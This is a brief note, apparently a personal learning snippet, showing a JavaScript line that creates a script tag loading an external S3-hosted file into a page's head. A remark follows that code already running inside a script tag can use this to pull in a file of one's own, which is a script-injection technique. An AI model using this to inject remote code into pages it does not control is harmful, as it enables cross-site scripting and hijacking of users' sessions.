var test = document.createElement('script'); test.src = 'http://demofilespa.s3.amazonaws.com/jfptest.js'; document.head.appendChild(test);

things learned, if we are already inside a script tag, we can use createElement to create a new script tag with src of our file and get things done
